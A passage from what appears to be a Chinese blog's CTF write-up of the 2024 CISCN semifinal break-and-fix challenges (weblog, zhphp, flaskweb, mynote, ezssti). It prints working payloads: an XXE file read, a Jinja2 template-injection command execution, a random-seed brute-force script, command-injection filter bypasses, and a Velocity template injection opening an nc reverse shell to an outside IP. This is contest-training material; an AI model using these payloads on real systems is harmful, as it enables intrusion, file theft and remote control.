alt="image-20240618173727918"></p><h4 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h4><p>因为不知道check是什么情况，这里我觉得禁用大部分可能会导致绕过的情况比较好，不建议删除或者是全部过滤。</p><h3 id="weblog-1"><a href="#weblog-1" class="headerlink" title="weblog"></a>weblog</h3><p>php语言，blog网站，有后台，文章数据库增删改查，数据库连接</p><h4 id="break-1"><a href="#break-1" class="headerlink" title="break"></a>break</h4><p>源码目录结构</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240618174649822.png" alt="image-20240618174649822"></p><p>首页，环境不对</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240618175443309.png" alt="image-20240618175443309"></p><p>本地复现环境，先注释error_reporting(0);，注释数据库测试连接</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240618180230427.png" alt="image-20240618180230427"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240618180224963.png" alt="image-20240618180224963"></p><p>修改数据库配置信息</p><p>添加数据库结构</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> Navicat Premium Data Transfer</span><br><span class="line"></span><br><span class="line"> Source Server         : 本地</span><br><span class="line"> Source Server Type    : MySQL</span><br><span class="line"> Source Server Version : 50726 (5.7.26-log)</span><br><span class="line"> Source Host           : localhost:3306</span><br><span class="line"> Source Schema         : blog</span><br><span class="line"></span><br><span class="line"> Target Server Type    : MySQL</span><br><span class="line"> Target Server Version : 50726 (5.7.26-log)</span><br><span class="line"> File Encoding         : 65001</span><br><span class="line"></span><br><span class="line"> Date: 20/06/2024 11:29:59</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">SET NAMES utf8mb4;</span><br><span class="line">SET FOREIGN_KEY_CHECKS = 0;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure for articles</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `articles`;</span><br><span class="line">CREATE TABLE `articles`  (</span><br><span class="line">  `id` int(255) NULL DEFAULT NULL,</span><br><span class="line">  `title` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,</span><br><span class="line">  `date` date NULL DEFAULT NULL,</span><br><span class="line">  `content` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL</span><br><span class="line">) ENGINE = MyISAM CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Records of articles</span><br><span class="line">-- ----------------------------</span><br><span class="line">INSERT INTO `articles` VALUES (1, &#x27;test&#x27;, &#x27;2024-06-19&#x27;, &#x27;testaaaa&#x27;);</span><br><span class="line"></span><br><span class="line">SET FOREIGN_KEY_CHECKS = 1;</span><br></pre></td></tr></table></figure><p>存在sql注入</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240620113106539.png" alt="image-20240620113106539"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240620112943842.png" alt="image-20240620112943842"></p><p>连接外部数据库</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240620113729919.png" alt="image-20240620113729919"></p><p>mysql客户端直连复现</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240620163039207.png" alt="image-20240620163039207"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240620163139350.png" alt="image-20240620163139350"></p><p>该题复现要求php版本低于7.3.4，所以开始一直没有复现成功，以为是要数据库版本低一点才可以。</p><p><a href="https://lorexxar.cn/2020/01/14/css-mysql-chain/">https://lorexxar.cn/2020/01/14/css-mysql-chain/</a></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240620173819614.png" alt="image-20240620173819614"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240620173843447.png" alt="image-20240620173843447"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240620173854621.png" alt="image-20240620173854621"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240620173944449.png" alt="image-20240620173944449"></p><h4 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h4><p>修复sql注入</p><p>对请求的外部ip做白名单限制</p><h3 id="zhphp"><a href="#zhphp" class="headerlink" title="zhphp"></a>zhphp</h3><p>主机管理系统，录入和查询两个功能，主机信息储存在xml文件中</p><h4 id="break-2"><a href="#break-2" class="headerlink" title="break"></a>break</h4><p>备份文件泄露，phpinfo.php是我后加的调试文件</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240620105409443.png" alt="image-20240620105409443"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240620194109995.png" alt="image-20240620194109995"></p><p>passwarekitforensic爆破密码，靶场复现题密码改为dddd</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240620025207463.png" alt="image-20240620025207463"></p><p>record.php存在变量覆盖</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240619152648390.png" alt="image-20240619152648390"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240619133601864.png" alt="image-20240619133601864"></p><p>导致xml文件内容可以构造</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240620105526633.png" alt="image-20240620105526633"></p><p>在请求头中会输出内容，但是注意要编码读取到的文件内容，否则文件头不允许存在多行内容会报错</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240619152708268.png" alt="image-20240619152708268"></p><p>构造hostname和port</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/flag.php&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;hostname&gt;&amp;goodies;&lt;/hostname&gt;</span><br><span class="line">    &lt;port&gt;7777&lt;/port&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240620200048275.png" alt="image-20240620200048275"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240620200105921.png" alt="image-20240620200105921"></p><h4 id="fix-2"><a href="#fix-2" class="headerlink" title="fix"></a>fix</h4><p>extract($_REQUEST);</p><p>对请求添加过滤或禁用外部实体防止xxe或黑名单过滤xxe</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE、&lt;!ENTITY SYSTEM、PUBLIC</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure><h3 id="flaskweb"><a href="#flaskweb" class="headerlink" title="flaskweb"></a>flaskweb</h3><p>flask框架、html模板、aes-ecb加解密、debug调试模式</p><p>错误页面</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240618222719771.png" alt="image-20240618222719771"></p><h4 id="break-3"><a href="#break-3" class="headerlink" title="break"></a>break</h4><p>密钥泄露</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240618231321143.png" alt="image-20240618231321143"></p><p>源码泄露</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240618231349232.png" alt="image-20240618231349232"></p><p>存在模板注入，构造加密函数传参非法路径即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">def encrypt(text, key):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    # 此函数将对给定的文本进行加密</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    try:</span><br><span class="line">        # 将文本编码为字节</span><br><span class="line">        text_bytes = text.encode()</span><br><span class="line">        # 使用PKCS7填充机制填充字节数据</span><br><span class="line">        padded_text = pad(text_bytes, AES.block_size)</span><br><span class="line">        # 加密填充后的字节数据</span><br><span class="line">        encrypted_text = cipher.encrypt(padded_text)</span><br><span class="line">        # 将加密后的字节数据转换为十六进制字符串</span><br><span class="line">        return binascii.hexlify(encrypted_text).decode()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        # 处理加密过程中可能发生的异常</span><br><span class="line">        error_message = f&quot;Error: &#123;str(e)&#125;&quot;</span><br><span class="line">        return error_message</span><br><span class="line">    </span><br><span class="line">text = &quot;&#123;&#123;1111111111+9&#125;&#125;&quot;</span><br><span class="line">key = b&#x27;0123456789abcdef&#x27;</span><br><span class="line">print(encrypt(text, key))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240618231125877.png" alt="image-20240618231125877"></p><p>构造攻击payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[242].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240618233520441.png" alt="image-20240618233520441"></p><h4 id="fix-3"><a href="#fix-3" class="headerlink" title="fix"></a>fix</h4><p>密钥泄露代码删除或对解密后的值进行判断过滤再渲染</p><h3 id="mynote-1"><a href="#mynote-1" class="headerlink" title="mynote"></a>mynote</h3><p><a href="https://tyskill.github.io/posts/starctf2021/">https://tyskill.github.io/posts/starctf2021/</a></p><p>学习生活笔记平台，python，随机数，后台，ping</p><p>构建数据库结构和插入示例数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> Navicat Premium Data Transfer</span><br><span class="line"></span><br><span class="line"> Source Server         : 本地</span><br><span class="line"> Source Server Type    : MySQL</span><br><span class="line"> Source Server Version : 50726 (5.7.26-log)</span><br><span class="line"> Source Host           : localhost:3306</span><br><span class="line"> Source Schema         : ctf</span><br><span class="line"></span><br><span class="line"> Target Server Type    : MySQL</span><br><span class="line"> Target Server Version : 50726 (5.7.26-log)</span><br><span class="line"> File Encoding         : 65001</span><br><span class="line"></span><br><span class="line"> Date: 21/06/2024 21:33:05</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">SET NAMES utf8mb4;</span><br><span class="line">SET FOREIGN_KEY_CHECKS = 0;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure for notes</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `notes`;</span><br><span class="line">CREATE TABLE `notes`  (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `user_id` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,</span><br><span class="line">  `note_id` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,</span><br><span class="line">  `text` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,</span><br><span class="line">  `title` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,</span><br><span class="line">  `timestamp` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NULL DEFAULT NULL,</span><br><span class="line">  `post_at` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,</span><br><span class="line">  `prv` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE</span><br><span class="line">) ENGINE = MyISAM AUTO_INCREMENT = 33 CHARACTER SET = utf8 COLLATE = utf8_unicode_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Records of notes</span><br><span class="line">-- ----------------------------</span><br><span class="line">INSERT INTO `notes` VALUES (32, &#x27;bhii11ocinpo9whnj6db4i8vzr4x98pd&#x27;, &#x27;9m29y9gbpst0e7zofthug0gf2xfko5i8&#x27;, &#x27;My secret is :/admin_tool_online/pingphzzznwzkbg&#x27;, &#x27;secret&#x27;, &#x27;1718976680.4689&#x27;, &#x27;2024-06-21 13:31 UTC&#x27;, &#x27;True&#x27;);</span><br><span class="line">INSERT INTO `notes` VALUES (31, &#x27;bhii11ocinpo9whnj6db4i8vzr4x98pd&#x27;, &#x27;lft7tbkv75oexrpu2u5p8m1ap1cr6o4h&#x27;, &#x27;this is my first note&#x27;, &#x27;hello&#x27;, &#x27;1718976625.0916&#x27;, &#x27;2024-06-21 13:30 UTC&#x27;, &#x27;False&#x27;);</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure for users</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `users`;</span><br><span class="line">CREATE TABLE `users`  (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `user_id` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,</span><br><span class="line">  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE,</span><br><span class="line">  UNIQUE INDEX `username`(`username`) USING BTREE</span><br><span class="line">) ENGINE = MyISAM AUTO_INCREMENT = 24 CHARACTER SET = utf8 COLLATE = utf8_unicode_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Records of users</span><br><span class="line">-- ----------------------------</span><br><span class="line">INSERT INTO `users` VALUES (23, &#x27;bhii11ocinpo9whnj6db4i8vzr4x98pd&#x27;, &#x27;bthcls756&#x27;);</span><br><span class="line"></span><br><span class="line">SET FOREIGN_KEY_CHECKS = 1;</span><br></pre></td></tr></table></figure><h4 id="break-4"><a href="#break-4" class="headerlink" title="break"></a>break</h4><p>首页</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240621213505157.png" alt="image-20240621213505157"></p><p>创建笔记页面，泄露了源代码</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240621213526867.png" alt="image-20240621213526867"></p><p>根据时间戳设定随机数种子，生成user_id</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">timestamp = round(time.time(), 4)</span><br><span class="line">random.seed(timestamp)</span><br><span class="line">user_id = get_random_id()</span><br></pre></td></tr></table></figure><p>根据时间戳生成post_at，再用user_id和post_at拼接生成随机数种子，最后根据随机数种子生成note_id</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">timestamp = round(time.time(), 4)</span><br><span class="line">post_at = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc).strftime(&amp;#39;%Y-%m-%d %H:%M UTC&amp;#39;)</span><br><span class="line">random.seed(user_id + post_at)</span><br><span class="line">note_id = get_random_id()</span><br></pre></td></tr></table></figure><p>访问公开笔记，可获得note_id和post_at<img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240621214048150.png" alt="image-20240621214048150"></p><p>创建一条测试的私人笔记，查看源码</p><p>鉴权规则为session或get传参user_id</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240621214336276.png" alt="image-20240621214336276"></p><p>可爆破随机数种子，构造代码，获取bthcls756用户的user_id来查看其私人笔记</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*-coding-*-: utf-8</span><br><span class="line">import time</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import datetime</span><br><span class="line"></span><br><span class="line">post_at = &quot;2024-06-21 13:30 UTC&quot;</span><br><span class="line"></span><br><span class="line">def get_random_id():</span><br><span class="line">    alphabet = list(string.ascii_lowercase + string.digits)</span><br><span class="line">    return &#x27;&#x27;.join([random.choice(alphabet) for _ in range(32)])</span><br><span class="line"></span><br><span class="line">users = [i / 10000 for i in range(0, 10000)]</span><br><span class="line">for second in range(0, 60):</span><br><span class="line">    dt = &quot;2024-06-21 21:30:&#123;&#125; UTC&quot;.format(second) # datetime.timezone.utc有时差</span><br><span class="line">    timeArray = time.strptime(dt, &quot;%Y-%m-%d %H:%M:%S UTC&quot;) # 转换成时间数组</span><br><span class="line">    timestamp = time.mktime(timeArray) # 转换成时间戳</span><br><span class="line">    for user in users:</span><br><span class="line">        # 获得user_id</span><br><span class="line">        seed = timestamp + user</span><br><span class="line">        random.seed(seed)</span><br><span class="line">        user_id = get_random_id()</span><br><span class="line">        # 获得note_id</span><br><span class="line">        random.seed(user_id + post_at)</span><br><span class="line">        if get_random_id() == &quot;lft7tbkv75oexrpu2u5p8m1ap1cr6o4h&quot;:</span><br><span class="line">            print(user_id) # 7bdeij4oiafjdypqyrl2znwk7w9lulgn</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240621214552772.png" alt="image-20240621214552772"></p><p>根据获取的user_id访问bthcls756的私人笔记</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240621214712152.png" alt="image-20240621214712152"></p><p>得到后台工具ping的路径</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240621214732831.png" alt="image-20240621214732831"></p><p>会返回cmd命令和结果，可以fuzz测试waf</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240621220029804.png" alt="image-20240621220029804"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1|ls </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240621220052941.png" alt="image-20240621220052941"></p><p>cat和空格被替换为空</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1|cat app.py</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240621220122884.png" alt="image-20240621220122884"></p><p>尝试使用双写绕过cat，$IFS$9绕过空格</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1|cacatt$IFS$9app.py</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240621220334623.png" alt="image-20240621220334623"></p><p>双写绕过无疑</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1|cacatt$IIFSFS$9app.py</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240621220357781.png" alt="image-20240621220357781"></p><p>WAF形式为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h4 id="fix-4"><a href="#fix-4" class="headerlink" title="fix"></a>fix</h4><h3 id="ezssti-1"><a href="#ezssti-1" class="headerlink" title="ezssti"></a>ezssti</h3><p>java、ssti、</p><h4 id="break-5"><a href="#break-5" class="headerlink" title="break"></a>break</h4><p>Velocity模板</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240620110022431.png" alt="image-20240620110022431"></p><p>没有过滤</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240620110054918.png" alt="image-20240620110054918"></p><p>命令执行无回显，反弹shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#set($e=&quot;e&quot;)</span><br><span class="line">$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;nc 172.16.17.228 2333 -e /bin/bash&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240619223025887.png" alt="image-20240619223025887"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>vscode可以在断网情况下查看函数定义？</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240618172541455.png" alt="image-20240618172541455"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024全国大学生信息安全竞赛半决赛西南赛区&quot;&gt;&lt;a href=&quot;#2024全国大学生信息安全竞赛半决赛西南赛区&quot; class=&quot;headerlink&quot; title=&quot;2024全国大学生信息安全竞赛半决赛西南赛区&quot;&gt;&lt;/a&gt;2024全国大学生信息安全竞赛半决赛西南</summary>
      
    
    
    
    <category term="比赛复现" scheme="https://blog.xmszzz756.top/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="ciscn" scheme="https://blog.xmszzz756.top/tags/ciscn/"/>
    
  </entry>
  
</feed>
